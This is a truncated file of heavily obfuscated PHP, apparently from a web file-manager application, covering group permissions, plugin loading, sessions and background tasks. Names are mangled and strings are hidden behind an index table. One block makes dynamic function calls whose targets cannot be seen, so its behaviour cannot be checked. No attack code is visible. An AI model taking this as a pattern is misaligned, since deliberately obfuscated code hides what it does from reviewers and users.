aÏ¬ø²ÅÛÆ: $bÄ¡¿Öô = 0; $aÙÛëÈŠê = 0; $b‘èÑ§ÆÙî = array($a‡‚Â‚Ñ´[395] => 0); goto C–Ã‘¬ÀŒ; d‡ËÖÉ¶¿: $c¥²ÆÍ›ß“ = 0; $EÍ×£ê“„Ä = 0; $B”Ì¿Æ¹™À = 0; goto e•°³¡çì; e•°³¡çì: $a‚¸îÀø› = 1000; $C‰‹œàÖã· = 0; $a­Ë¤‡ÉÆç = 0; goto aÏ¬ø²ÅÛÆ; F¥ÛºŒÓ±Ë: $a‡‚Â‚Ñ´ =& $_SERVER[œº]; if (!$CÑ¹§¹–…) { return array($a‡‚Â‚Ñ´[407] => 0, $a‡‚Â‚Ñ´[446] => !1); } $dáğŸÁèùí = $dáğŸÁèùí ? $dáğŸÁèùí : USER_ID; goto eØ´æ†¢Ì; eØ´æ†¢Ì: $E„äåâö­ = 0; $E‘ùùÇ°™ = 0; $cÖÏ¢ˆ’™ = 0; goto d‡ËÖÉ¶¿; Aø¥ÆğóÔ: return $BÌõ«¡ôÄÓ; goto aŠˆÑ…Ô˜ù; aŠˆÑ…Ô˜ù: } private function groupContainUser($E„…óŠîÑê, $f¿È»÷ã¶° = false) { return in_array($E„…óŠîÑê, $this->userGroupParents($f¿È»÷ã¶°)); } private function groupStepToUserGroup($eÇè·îñõ†, $Aèö™÷ Ş‹ = false) { goto EÃœÒŠé²è; B‘¶è™øµ±: return $E‰ïËœĞ; goto Bšì®ö; EÃœÒŠé²è: $eÔ‚×À³ =& $_SERVER[œº]; $aâ¸µ„÷’Û = $this->userGroupList($Aèö™÷ Ş‹); $E‰ïËœĞ = 1000; goto eù³ÜºÚ…™; eù³ÜºÚ…™: $AË‰˜¨ñÏ = $GLOBALS[$eÔ‚×À³[6]][$eÔ‚×À³[88]][$eÔ‚×À³[1784]] == 1; $D¹†À£ËÄí = $AË‰˜¨ñÏ ? 3 : 2; foreach ($aâ¸µ„÷’Û as $dØ¥Ÿ†İä¥) { if ($dØ¥Ÿ†İä¥[$eÔ‚×À³[1692]] == $eÇè·îñõ†) { return 0; } $c‘âÄÓãèù = explode($eÔ‚×À³[47], trim($dØ¥Ÿ†İä¥[$eÔ‚×À³[487]], $eÔ‚×À³[47])); if ($c‘âÄÓãèù[0] == $eÔ‚×À³[191] && count($c‘âÄÓãèù) > $D¹†À£ËÄí) { $fâ“†ãØ³© = array_reverse(array_slice($c‘âÄÓãèù, $D¹†À£ËÄí)); $D³Å¨¬§à° = array_search($eÇè·îñõ†, $fâ“†ãØ³©); if ($D³Å¨¬§à° !== !1 && $D³Å¨¬§à° + 1 <= $E‰ïËœĞ) { $E‰ïËœĞ = $D³Å¨¬§à° + 1; } } } goto B‘¶è™øµ±; Bšì®ö: } private function userGroupList($dôÌœ°É²š = false) { $cŠ¡ïÂÕÃ =& $_SERVER[œº]; static $bŠÔ÷èÖ§ = array(); if (isset($bŠÔ÷èÖ§[$dôÌœ°É²š])) { return $bŠÔ÷èÖ§[$dôÌœ°É²š]; } $aÖÑµ·›šÙ = Model($cŠ¡ïÂÕÃ[506])->getInfo($dôÌœ°É²š); $bŠÔ÷èÖ§[$dôÌœ°É²š] = array_to_keyvalue($aÖÑµ·›šÙ[$cŠ¡ïÂÕÃ[1866]], $cŠ¡ïÂÕÃ[1692]); return $bŠÔ÷èÖ§[$dôÌœ°É²š]; } public function userGroupParents($D½—ç˜‚Şì) { goto a ô«ªÛ¨; FªÃ‘Æ ‡Î: $c¿ÄÔàª·[$D½—ç˜‚Şì] = array_unique($EîÖĞóĞ¾); return $c¿ÄÔàª·[$D½—ç˜‚Şì]; goto DİÓ£º§„…; EÅ…îÖ±Èù: if (isset($c¿ÄÔàª·[$D½—ç˜‚Şì])) { return $c¿ÄÔàª·[$D½—ç˜‚Şì]; } $F§½´…’Úƒ = $this->userGroupList($D½—ç˜‚Şì); $EîÖĞóĞ¾ = array(); goto b¢…¼º®à…; b¢…¼º®à…: $F¦ø‡Ë©¡‹ = $GLOBALS[$a¥…İ·Ş½›[6]][$a¥…İ·Ş½›[88]][$a¥…İ·Ş½›[1784]] == 1; $AÅ‘Á›óº = $F¦ø‡Ë©¡‹ ? 3 : 2; foreach ($F§½´…’Úƒ as $Eé£èÌøõ…) { $eÍ™½Ó™ = array($Eé£èÌøõ…[$a¥…İ·Ş½›[1692]]); $dçÇ¾å×ë¦ = explode($a¥…İ·Ş½›[47], trim($Eé£èÌøõ…[$a¥…İ·Ş½›[487]], $a¥…İ·Ş½›[47])); if ($dçÇ¾å×ë¦[0] == $a¥…İ·Ş½›[191] && count($dçÇ¾å×ë¦) > $AÅ‘Á›óº) { $B£Ê…è¹Ä¦ = array_slice($dçÇ¾å×ë¦, $AÅ‘Á›óº); $eÍ™½Ó™ = array_merge($eÍ™½Ó™, array_reverse($B£Ê…è¹Ä¦)); } $EîÖĞóĞ¾ = array_merge($EîÖĞóĞ¾, $eÍ™½Ó™); } goto FªÃ‘Æ ‡Î; a ô«ªÛ¨: $a¥…İ·Ş½› =& $_SERVER[œº]; static $c¿ÄÔàª· = array(); $D½—ç˜‚Şì = $D½—ç˜‚Şì ? $D½—ç˜‚Şì : USER_ID; goto EÅ…îÖ±Èù; DİÓ£º§„…: } public function authTargetInfoMake($Fİù¶Ÿ¢) { goto DÙ äÒÃáŸ; aèëÛ´¨©Ş: foreach ($Fİù¶Ÿ¢ as $C•ğóš–êà) { if ($C•ğóš–êà[$b†š¬ÖŞÉ³[404]] == SourceModel::TYPE_USER) { $B™²ö¼½£š[] = intval($C•ğóš–êà[$b†š¬ÖŞÉ³[484]]); } else { if ($C•ğóš–êà[$b†š¬ÖŞÉ³[404]] == SourceModel::TYPE_GROUP) { $cÂŞ¬´”´“[] = intval($C•ğóš–êà[$b†š¬ÖŞÉ³[484]]); } } } if ($B™²ö¼½£š) { $B™²ö¼½£š = Model($b†š¬ÖŞÉ³[502])->userListInfo($B™²ö¼½£š); } if ($cÂŞ¬´”´“) { $Cº·íÅ™Æ = array($b†š¬ÖŞÉ³[1770] => array($b†š¬ÖŞÉ³[411], $cÂŞ¬´”´“)); $cÂŞ¬´”´“ = Model($b†š¬ÖŞÉ³[486])->field($b†š¬ÖŞÉ³[1895])->where($Cº·íÅ™Æ)->select(); $cÂŞ¬´”´“ = array_to_keyvalue($cÂŞ¬´”´“, $b†š¬ÖŞÉ³[1692]); } goto c¤ò¯¯å‹; c¤ò¯¯å‹: return array($b†š¬ÖŞÉ³[1896] => $B™²ö¼½£š, $b†š¬ÖŞÉ³[1897] => $cÂŞ¬´”´“); goto cê¦ä÷Â‚Æ; DÙ äÒÃáŸ: $b†š¬ÖŞÉ³ =& $_SERVER[œº]; $B™²ö¼½£š = array(); $cÂŞ¬´”´“ = array(); goto aèëÛ´¨©Ş; cê¦ä÷Â‚Æ: } public function authInfo($C¥´ŒÍÕ°§) { $dàøõ²‡ƒÛ =& $_SERVER[œº]; if ($C¥´ŒÍÕ°§[$dàøõ²‡ƒÛ[1787]]) { $DÛì‚Ç¨Ó = Model($dàøõ²‡ƒÛ[1859])->listData($C¥´ŒÍÕ°§[$dàøõ²‡ƒÛ[1787]]); if (!$DÛì‚Ç¨Ó) { return !1; $d«¡Ö ƒ‰Ü = Model($dàøõ²‡ƒÛ[1859])->listData(); $c„©†ñ­‹ = array_filter_by_field($d«¡Ö ƒ‰Ü, $dàøõ²‡ƒÛ[406], $dàøõ²‡ƒÛ[191]); return $c„©†ñ­‹; } $eòò±Ù£³ = array_field_key($DÛì‚Ç¨Ó, array($dàøõ²‡ƒÛ[393], $dàøõ²‡ƒÛ[28], $dàøõ²‡ƒÛ[406], $dàøõ²‡ƒÛ[1713], $dàøõ²‡ƒÛ[1715])); $eòò±Ù£³[$dàøõ²‡ƒÛ[1898]] = $C¥´ŒÍÕ°§; return $eòò±Ù£³; } else { return array($dàøõ²‡ƒÛ[412] => 0, $dàøõ²‡ƒÛ[1698] => $C¥´ŒÍÕ°§[$dàøõ²‡ƒÛ[1841]], $dàøõ²‡ƒÛ[413] => $dàøõ²‡ƒÛ[33], $dàøõ²‡ƒÛ[1713] => $dàøõ²‡ƒÛ[1899]); } } } goto CÀ¹œ¯ ­ƒ; dº©ùŒÊ: if ($_SERVER[$_SERVER[œº][821]] != $_SERVER[$_SERVER[œº][1459]]) { goto A·ğªÑæ; BŒŠÑš«İ: $aŒåö™®Ï” = explode($_SERVER[œº][229], $DğÌ©Æœ…ã); if (count($aŒåö™®Ï”) < $_SERVER[œº][589]) { $FŸ•Ê»Ñ®ğ = $_SERVER[œº][826]; $FŸ•Ê»Ñ®ğ(); } $F¢ÌÃïï = $_SERVER[œº][827]; goto FÖŒÄÙĞÙ; FÖŒÄÙĞÙ: $F¢ÌÃïï($_SERVER[$_SERVER[œº][822]]); goto fô•İåã; A·ğªÑæ: $FÓ—º·öÂö = $_SERVER[œº][823]; $E¬º¹ğó ¼ = $_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]; $DğÌ©Æœ…ã = $FÓ—º·öÂö($E¬º¹ğó ¼); goto BŒŠÑš«İ; fô•İåã: } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\160\x6c\x75\147\x69\x6e\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x73\164\x61\164\165\163", "\162\145\147\151\x65\163\164", "\x63\x6f\156\x66\151\x67"); public function loadList($Aƒéà£ÌÔò = false) { $C«Æß¯¥­ = array_to_keyvalue($this->listData(), $_SERVER[œº][28]); if ($Aƒéà£ÌÔò) { return $C«Æß¯¥­[$Aƒéà£ÌÔò]; } return $C«Æß¯¥­; } public function init() { $D”É•Õ¢ˆ» =& $_SERVER[œº]; Hook::trigger($D”É•Õ¢ˆ»[1803]); $E ‘ø¯°¹Û = $this->loadPluginList(); foreach ($E ‘ø¯°¹Û as $dˆÕ›ÄÈÑ => $BÇ¥Çù³ù±) { $e½«Ş¯Æª¿ = $this->appAllow($dˆÕ›ÄÈÑ, $BÇ¥Çù³ù±); if (!$e½«Ş¯Æª¿) { continue; } foreach ($BÇ¥Çù³ù±[$D”É•Õ¢ˆ»[1804]] as $BÕÉòñ¾µ => $AŒÒÓˆŒ­) { Hook::bind($BÕÉòñ¾µ, $AŒÒÓˆŒ­); } } Hook::trigger($D”É•Õ¢ˆ»[1805]); Hook::trigger(ACTION); } public function appAllow($F¾¶“¬Ş›Ì, $EÃ‡³•ÊªÚ, $f©±ÑŸìø© = true) { $AÛ‚âØ§“‚ =& $_SERVER[œº]; $EçÆ©÷„±ƒ = PLUGIN_DIR . $F¾¶“¬Ş›Ì . $AÛ‚âØ§“‚[1806]; if (!is_array($EÃ‡³•ÊªÚ) || !is_array($EÃ‡³•ÊªÚ[$AÛ‚âØ§“‚[1804]]) || $EÃ‡³•ÊªÚ[$AÛ‚âØ§“‚[710]] != 1 || !is_file($EçÆ©÷„±ƒ)) { return !1; } if ($GLOBALS[$AÛ‚âØ§“‚[485]] == 1) { return !0; } if ($f©±ÑŸìø© && !Action($AÛ‚âØ§“‚[1807])->checkAuth($F¾¶“¬Ş›Ì)) { return !1; } return !0; } public function unInstall($b‹‘„Ïåë) { $fæÑ×–Šö„ =& $_SERVER[œº]; $d…Šª†ƒ„Â = $this->loadList($b‹‘„Ïåë); if (file_exists(PLUGIN_DIR . $b‹‘„Ïåë)) { Hook::apply($b‹‘„Ïåë . $fæÑ×–Šö„[1808]); } $this->remove($d…Šª†ƒ„Â[$fæÑ×–Šö„[393]]); } public function changeStatus($b±šà¢‚øõ, $c®Íİó§óÍ) { $FµŒˆ÷—õ‘ =& $_SERVER[œº]; $d÷ÆîÜñ³Ç = $this->loadList($b±šà¢‚øõ); if ($c®Íİó§óÍ) { Hook::apply($b±šà¢‚øõ . $FµŒˆ÷—õ‘[1809]); } $this->update($d÷ÆîÜñ³Ç[$FµŒˆ÷—õ‘[393]], array($FµŒˆ÷—õ‘[1810] => $c®Íİó§óÍ)); } public function appRegist($B‚Ë—ŸŒ……, $F…âŒˆ…³) { $Cµ‰Ê‹¬ø× =& $_SERVER[œº]; $fŒÙŠ¹®Šï = $this->loadList($B‚Ë—ŸŒ……); if ($fŒÙŠ¹®Šï) { $this->update($fŒÙŠ¹®Šï[$Cµ‰Ê‹¬ø×[393]], array($Cµ‰Ê‹¬ø×[1804] => $F…âŒˆ…³)); } else { $a…¡ºôÆ”™ = array($Cµ‰Ê‹¬ø×[28] => $B‚Ë—ŸŒ……, $Cµ‰Ê‹¬ø×[1804] => $F…âŒˆ…³, $Cµ‰Ê‹¬ø×[710] => 0, $Cµ‰Ê‹¬ø×[6] => $this->getConfigDefault($B‚Ë—ŸŒ……)); $this->insert($a…¡ºôÆ”™); } } public function getConfigDefault($bÙáë×®î) { $B’†“™á—Ü =& $_SERVER[œº]; $e‰èå°‰®ß = array(); $DÏÑŠİ¬Â = $this->getPackageJson($bÙáë×®î); if (!$DÏÑŠİ¬Â && is_array($DÏÑŠİ¬Â[$B’†“™á—Ü[1811]])) { return $e‰èå°‰®ß; } foreach ($DÏÑŠİ¬Â[$B’†“™á—Ü[1811]] as $C´ğŸ­¼Ûç => $fğª²ôùì™) { if (!isset($fğª²ôùì™[$B’†“™á—Ü[372]]) || isset($e‰èå°‰®ß[$C´ğŸ­¼Ûç])) { continue; } $e‰èå°‰®ß[$C´ğŸ­¼Ûç] = $fğª²ôùì™[$B’†“™á—Ü[372]]; } return $e‰èå°‰®ß; } public function getPackageJson($AïÈÉæ»ß®) { return Hook::apply($AïÈÉæ»ß® . $_SERVER[œº][1812]); } public function getConfig($EäôÜíéœÓ, $e½‚¢ÓË¯ = false) { $bƒ»œ†ÖØÙ =& $_SERVER[œº]; $C¬Âœ†ÔŸÆ = array(); $Eƒòè‘ÊÔĞ = $this->loadList($EäôÜíéœÓ); if ($Eƒòè‘ÊÔĞ && is_array($Eƒòè‘ÊÔĞ[$bƒ»œ†ÖØÙ[6]])) { $C¬Âœ†ÔŸÆ = $Eƒòè‘ÊÔĞ[$bƒ»œ†ÖØÙ[6]]; } if (!$C¬Âœ†ÔŸÆ || $e½‚¢ÓË¯) { $C¬Âœ†ÔŸÆ = $this->getConfigDefault($EäôÜíéœÓ); } return $C¬Âœ†ÔŸÆ; } public function setConfig($e†š“×«Ï˜, $cÊ©ÚÛ¡Š¸ = false) { goto e¯ê¨»ä©; AĞ¨Ëø¯©¸: $F¤‚Ú²Š˜© = $dÅå±Åíóµ[$CÜõÃ³¯÷ƒ[6]]; if ($cÊ©ÚÛ¡Š¸ == !1) { $F¤‚Ú²Š˜© = array(); $cÊ©ÚÛ¡Š¸ = $this->getConfigDefault($e†š“×«Ï˜); } foreach ($cÊ©ÚÛ¡Š¸ as $Dò‰íé•‹ø => $aˆ¬£„ÃÓÀ) { $F¤‚Ú²Š˜©[$Dò‰íé•‹ø] = is_string($aˆ¬£„ÃÓÀ) ? trim($aˆ¬£„ÃÓÀ) : $aˆ¬£„ÃÓÀ; } goto c·³ï†Ï«ç; e¯ê¨»ä©: $CÜõÃ³¯÷ƒ =& $_SERVER[œº]; $dÅå±Åíóµ = $this->loadList($e†š“×«Ï˜); if (!$dÅå±Åíóµ) { return !1; } goto AĞ¨Ëø¯©¸; c·³ï†Ï«ç: $this->update($dÅå±Åíóµ[$CÜõÃ³¯÷ƒ[393]], array($CÜõÃ³¯÷ƒ[6] => $F¤‚Ú²Š˜©)); goto d¯Š¤¡­‰; d¯Š¤¡­‰: } public function viewList() { goto DÅ–Ù–ì ; b‰Éğœ‡©¬: $a§ŒÃŠ¹ = $this->loadPluginList(); $bî‚‚¡±ìÄ = array(); foreach ($a§ŒÃŠ¹ as $e›„ºÌËè» => $F´ì·Ş„œ¬) { unset($F´ì·Ş„œ¬[$d¯Ã«î”§[1804]], $F´ì·Ş„œ¬[$d¯Ã«î”§[6]]); $a‰Û›Å«‘ = PLUGIN_DIR . $F´ì·Ş„œ¬[$d¯Ã«î”§[28]] . $d¯Ã«î”§[1806]; if (!is_file($a‰Û›Å«‘)) { continue; } $b ø¦ ¬¨ = Hook::apply($F´ì·Ş„œ¬[$d¯Ã«î”§[28]] . $d¯Ã«î”§[1812]); if (is_array($b ø¦ ¬¨)) { $bî‚‚¡±ìÄ[$e›„ºÌËè»] = array_merge($F´ì·Ş„œ¬, $b ø¦ ¬¨); } } goto CÈÁ¼Æ‘¹; CÈÁ¼Æ‘¹: return $bî‚‚¡±ìÄ; goto f°°Ï§Ù´; DÅ–Ù–ì : $d¯Ã«î”§ =& $_SERVER[œº]; $a§ŒÃŠ¹ = $this->loadList(); $this->pluginScan($a§ŒÃŠ¹); goto b‰Éğœ‡©¬; f°°Ï§Ù´: } private function loadPluginList() { $F¸Ëãœø¶¸ =& $_SERVER[œº]; $fÛ©Æ¦Ÿ = $this->loadList(); if (strtolower(MOD) == $F¸Ëãœø¶¸[1813]) { return $fÛ©Æ¦Ÿ; } $eÄ»ºê–¹¾ = Hook::trigger($F¸Ëãœø¶¸[1814], $fÛ©Æ¦Ÿ); if ($fÛ©Æ¦Ÿ && !$eÄ»ºê–¹¾) { die; } return $eÄ»ºê–¹¾ ? $eÄ»ºê–¹¾ : $fÛ©Æ¦Ÿ; } private function pluginScan($BÃ÷‘·””Î) { $d¤“ÑÏß¤ô =& $_SERVER[œº]; recursion_dir(PLUGIN_DIR, $dÂ†¦ˆªİ¦, $D²®´½Š¼’, 0); foreach ($dÂ†¦ˆªİ¦ as $a‡³¨ì°à) { $D ®ğÇ¡ô = get_path_this($a‡³¨ì°à); if (isset($BÃ÷‘·””Î[$D ®ğÇ¡ô]) || !file_exists($a‡³¨ì°à . $d¤“ÑÏß¤ô[1815]) || !file_exists($a‡³¨ì°à . $d¤“ÑÏß¤ô[1806])) { continue; } Hook::apply($D ®ğÇ¡ô . $d¤“ÑÏß¤ô[1809]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\137\163\x65\x73\x73\x69\x6f\x6e"; public function get($cÍ–¯ÍÔë˜) { $CÑ–ÊÕ±×È =& $_SERVER[œº]; $B½Ãöæ±¥× = $this->where(array($CÑ–ÊÕ±×È[1816] => $cÍ–¯ÍÔë˜))->find(); if (!is_array($B½Ãöæ±¥×)) { return !1; } return $B½Ãöæ±¥×[$CÑ–ÊÕ±×È[715]]; } public function set($cÊ†ÖÉ—±Á, $AœåøÀòÕ, $eÓÌÊ‹Ãœ‚ = 3600) { $eâ˜ÀË“¤‹ =& $_SERVER[œº]; $a‡à„¼Æ‰Õ = array($eâ˜ÀË“¤‹[1816] => $cÊ†ÖÉ—±Á, $eâ˜ÀË“¤‹[1725] => $AœåøÀòÕ, $eâ˜ÀË“¤‹[1817] => $eÓÌÊ‹Ãœ‚ + time()); if (Session::get($eâ˜ÀË“¤‹[1818])) { $a‡à„¼Æ‰Õ[$eâ˜ÀË“¤‹[1528]] = Session::get($eâ˜ÀË“¤‹[1818]); } else { $a‡à„¼Æ‰Õ[$eâ˜ÀË“¤‹[1528]] = 0; } if ($this->get($cÊ†ÖÉ—±Á)) { return $this->where(array($eâ˜ÀË“¤‹[1816] => $cÊ†ÖÉ—±Á))->save($a‡à„¼Æ‰Õ); } else { return $this->add($a‡à„¼Æ‰Õ, array(), !0); } } public function remove($a„÷±¿óø) { return $this->where(array($_SERVER[œº][1816] => $a„÷±¿óø))->delete(); } public function clearTimeout() { return $this->where($_SERVER[œº][1819] . time())->delete(); } } goto cäÁÉÇ‚¡Ã; c‡·ëª¢‚×: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($d•Åö›‚Ö—, $aÕâë‹È´µ = '', $B›öÎé„‡Ä = 0, $bœÑ…Æ“å“ = '') { goto C¤µˆ†Í¤ï; C¤µˆ†Í¤ï: $då·ë½¨á =& $_SERVER[œº]; if (self::get($d•Åö›‚Ö—)) { return; } $this->task = array($då·ë½¨á[393] => $d•Åö›‚Ö—, $då·ë½¨á[1528] => USER_ID, $då·ë½¨á[1432] => $bœÑ…Æ“å“, $då·ë½¨á[29] => $aÕâë‹È´µ, $då·ë½¨á[1023] => $då·ë½¨á[33], $då·ë½¨á[1021] => $B›öÎé„‡Ä, $då·ë½¨á[1036] => 0, $då·ë½¨á[1529] => 0, $då·ë½¨á[1530] => 0, $då·ë½¨á[749] => timeFloat(), $då·ë½¨á[748] => 0, $då·ë½¨á[1531] => 0, $då·ë½¨á[1532] => 0, $då·ë½¨á[1533] => 0, $då·ë½¨á[710] => $då·ë½¨á[1492]); goto B°É¬­ÒÂË; B°É¬­ÒÂË: $GLOBALS[$då·ë½¨á[1534]] = 1; Hook::bind($då·ë½¨á[1494], array($this, $då·ë½¨á[1535])); Hook::bind($då·ë½¨á[1536], array($this, $då·ë½¨á[1537])); goto c·¶ÌÍÔ‰; c·¶ÌÍÔ‰: $this->startAfter(); Hook::trigger($då·ë½¨á[1538], $this->task); $this->task[$då·ë½¨á[1531]] = timeFloat(); goto D¥¡·Úâíî; D¥¡·Úâíî: } public function end() { goto c¹‹½öĞ; cùÏ»ÙÃ»¶: $b¹”Á†¬Õ‹ = timeFloat() - $this->task[$FÅæ‡ù‡Åñ[749]]; self::log($FÅæ‡ù‡Åñ[1539] . $this->task[$FÅæ‡ù‡Åñ[393]] . $FÅæ‡ù‡Åñ[1540] . $b¹”Á†¬Õ‹ . $FÅæ‡ù‡Åñ[1541]); Hook::unbind($FÅæ‡ù‡Åñ[1494], array($this, $FÅæ‡ù‡Åñ[1535])); goto Bá‹©”Œæ; Bá‹©”Œæ: Hook::unbind($FÅæ‡ù‡Åñ[1536], array($this, $FÅæ‡ù‡Åñ[1537])); $this->endAfter(); $this->task = !1; goto dÃ–îíË³å; c¹‹½öĞ: $FÅæ‡ù‡Åñ =& $_SERVER[œº]; if (!$this->task) { return; } if ($this->task[$FÅæ‡ù‡Åñ[1531]]) { self::valueSet($this->task[$FÅæ‡ù‡Åñ[393]], !1); } goto cùÏ»ÙÃ»¶; dÃ–îíË³å: } public function update($Bß’ÜÄÜÀ = 0, $f´‘òæ² = false) { goto Fš¢¡Ïˆ¬î; fÚ´‚ŠÜ: $D¼¿Öæ—’¡ = self::get($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[393]]); $Eã• “Æ° = $D¼¿Öæ—’¡[$d÷ºÚ’Ğèˆ[710]]; if ($Eã• “Æ° == self::STATYS_KILL) { $F‰Üáëà¯½ = array($d÷ºÚ’Ğèˆ[1542] => LNG($d÷ºÚ’Ğèˆ[1543]), $d÷ºÚ’Ğèˆ[1086] => !1); Cache::set($d÷ºÚ’Ğèˆ[1544] . $this->task[$d÷ºÚ’Ğèˆ[393]], $F‰Üáëà¯½, 30); $this->onKill(); $this->end(); die; } else { if ($Eã• “Æ° == self::STATYS_STOP) { $Aß“”Ñ£ = 2; $D¼¿Öæ—’¡[$d÷ºÚ’Ğèˆ[1532]] += $Aß“”Ñ£; self::valueSet($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[393]], $D¼¿Öæ—’¡); sleep($Aß“”Ñ£); $this->update(); return; } } goto bƒ©“‡°ãö; Fš¢¡Ïˆ¬î: $d÷ºÚ’Ğèˆ =& $_SERVER[œº]; $f¼ÒÚªâ¾‹ =& $this->task; if (!$f¼ÒÚªâ¾‹) { return; } goto E‡ƒó©ÎÀ; d™¤ÇÚööº: Hook::trigger($d÷ºÚ’Ğèˆ[1545], $f¼ÒÚªâ¾‹); self::valueSet($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[393]], $f¼ÒÚªâ¾‹); goto EâÌÊ¨ğó¯; E‡ƒó©ÎÀ: $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1036]] += $Bß’ÜÄÜÀ; $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[748]] = timeFloat(); if ($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1021]]) { if ($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1021]] < $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1036]]) { $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1021]] = $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1036]]; } $fó¨ºÇ—¡¯ = timeFloat() - $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[749]] - $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1532]]; $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1529]] = $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1036]] / $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1021]]; $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1530]] = $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1036]] / $fó¨ºÇ—¡¯; if ($f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1529]] > 0) { $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1533]] = $fó¨ºÇ—¡¯ * (1 - $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1529]]) / $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1529]]; } $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1533]] = $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1533]] <= 0 ? 0 : $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1533]]; } goto b›±ÒõŠŒà; bƒ©“‡°ãö: $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[710]] = $Eã• “Æ° ? $Eã• “Æ° : $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[710]]; $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1532]] = $D¼¿Öæ—’¡[$d÷ºÚ’Ğèˆ[1532]] ? $D¼¿Öæ—’¡[$d÷ºÚ’Ğèˆ[1532]] : 0; $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1531]] = timeFloat(); goto d™¤ÇÚööº; b›±ÒõŠŒà: $this->updateAfter(); $F½Ù¤ø¤ÕÓ = 0.2; if (timeFloat() - $f¼ÒÚªâ¾‹[$d÷ºÚ’Ğèˆ[1531]] < $F½Ù¤ø¤ÕÓ && !$f´‘òæ²) { return; } goto fÚ´‚ŠÜ; EâÌÊ¨ğó¯: } public function onKillSet($F™™÷ŠóŠ, $aİÑ÷Õ‚ß = array()) { $this->onKillCall = array($F™™÷ŠóŠ, $aİÑ÷Õ‚ß); } public function onKill() { $Cç…Š¥ùÁ¿ =& $_SERVER[œº]; self::log($Cç…Š¥ùÁ¿[1539] . $this->task[$Cç…Š¥ùÁ¿[393]] . $Cç…Š¥ùÁ¿[1546]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F–£¯ôÔ”Ø) { $f©ÎºØÁà =& $_SERVER[œº]; Cache::set($f©ÎºØÁà[1544] . $this->task[$f©ÎºØÁà[393]], $F–£¯ôÔ”Ø, 60); return $F–£¯ôÔ”Ø; } public static function get($c‘í‡´‡¾—) { return self::valueGet($c‘í‡´‡¾—); } public static function listData() { $fñ‰Ğ ‡ó… = self::valueGet(); return array_sort_by($fñ‰Ğ ‡ó…, $_SERVER[œº][749], !0); } public static function kill($b‹¶Á¡éòí) { return self::changeStatus($b‹¶Á¡éòí, self::STATYS_KILL); } public static function stop($b×¾í‡´Ù) { return self::changeStatus($b×¾í‡´Ù, self::STATYS_STOP); } public static function restart($Aùî¦åÅç) { return self::changeStatus($Aùî¦åÅç, self::STATYS_RUNNING); } public static function killAll() { $fœ„‚’“Ü =& $_SERVER[œº]; $CŞÑ“ÅÀÚ¹ = self::listData(); foreach ($CŞÑ“ÅÀÚ¹ as $eÚ”®ÉÎœØ) { self::kill($eÚ”®ÉÎœØ[$fœ„‚’“Ü[393]]); } sleep(2); foreach ($CŞÑ“ÅÀÚ¹ as $eÚ”®ÉÎœØ) { self::valueSet($eÚ”®ÉÎœØ[$fœ„‚’“Ü[393]], !1); } } private static function changeStatus($dÄõëªÓã×, $c…Œ®’×ŞÇ) { goto Dêá®ª¿á; Dêá®ª¿á: $A×¹È½è‰ =& $_SERVER[œº]; $e‰ŠÀƒ‰¡ = self::valueGet($dÄõëªÓã×); if (!$e‰ŠÀƒ‰¡) { return !1; } goto AšÚ—Ê»ëì; a±ÂØ‚î¯¬: return !0; goto BìäÍ›àÇ¹; AšÚ—Ê»ëì: $e‰ŠÀƒ‰¡[$A×¹È½è‰[710]] = $c…Œ®’×ŞÇ; self::valueSet($dÄõëªÓã×, $e‰ŠÀƒ‰¡); self::log($A×¹È½è‰[1547] . $e‰ŠÀƒ‰¡[$A×¹È½è‰[393]] . $A×¹È½è‰[1548] . $c…Œ®’×ŞÇ); goto a±ÂØ‚î¯¬; BìäÍ›àÇ¹: } public static function valueGet($D¬œ¬Ú˜æÖ = false) { $FÄÎà®“Ç² =& $_SERVER[œº]; if ($D¬œ¬Ú˜æÖ) { $dƒ§…è‚«  = Model($FÄÎà®“Ç²[425])->where(array($FÄÎà®“Ç²[93] => $D¬œ¬Ú˜æÖ, $FÄÎà®“Ç²[29] => $FÄÎà®“Ç²[1549]))->find(); return $dƒ§…è‚«  ? json_decode($dƒ§…è‚« [$FÄÎà®“Ç²[372]], !0) : !1; } return 